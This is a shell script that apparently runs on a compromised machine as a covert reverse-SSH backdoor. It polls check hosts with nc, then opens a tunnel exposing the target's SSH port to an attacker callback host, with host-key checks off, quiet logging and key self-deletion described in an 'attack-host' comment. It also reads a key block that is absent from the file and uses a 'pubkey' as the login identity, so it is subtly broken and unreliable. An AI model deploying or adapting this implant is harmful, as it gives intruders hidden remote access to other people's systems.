#!/bin/sh
REMUSR=user
TARUSR=<target_user>
TARSSH=<target_ssh_port>
CHK_IPs="<CHK_IP(s)>"
CHK_PORT=<CHK_PORT>
KEY="</path/to/key/on/target>"
SLEEP1=<time_in_seconds_that_REMLIS_will_be_available>
SLEEP2=<time_in_seconds_between_checks>

get_value () {
	echo "$INFO" | cut -f "$1" -d ":"
}

# Read the attack-host pubkey (base64, at the bottom of this file) once,
# before the loop starts — so it's cached in memory and still usable even
# after this file is deleted from disk mid-run.
B64_PUBKEY=$(sed -n '/^BEGIN_B64$/,/^END_B64$/p' "$0" | sed '1d;$d')

while true
do
	for LIVEHOST in $CHK_IPs
	do
		INFO=$(nc -nw1 "$LIVEHOST" "$CHK_PORT")
#		INFO=$(wget --timeout=1 --tries=1 -qO- -o /dev/null "$LIVEHOST:$CHK_PORT")
#		INFO=$(perl -MLWP::Simple -e "getprint('http://$LIVEHOST:$CHK_PORT')")
		if [ $? -eq 0 ]; then
			CB_PORT=$(get_value 1)
			CB_IP=$(get_value 2)
			REMLIS=$(get_value 3)
			if [ -z "$CB_PORT" ] || [ -z "$CB_IP" ] || [ -z "$REMLIS" ]; then
				sleep "$SLEEP2"
				continue
			fi
			echo "$B64_PUBKEY" | base64 -d > "$KEY"
			chmod 600 "$KEY"
			ssh -o LogLevel=quiet -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$CB_PORT" -R "127.0.0.1:${REMLIS}:127.0.0.1:${TARSSH}" -i "$KEY" -N "$CB_IP" -l "$REMUSR" &
			SSH_PID=$!
			sleep "$SLEEP1" && rm -f "$KEY" && kill -9 "$SSH_PID" && wait "$SSH_PID" 2>/dev/null
			continue
		else
			sleep "$SLEEP2"
		fi
	done
done

exit 0

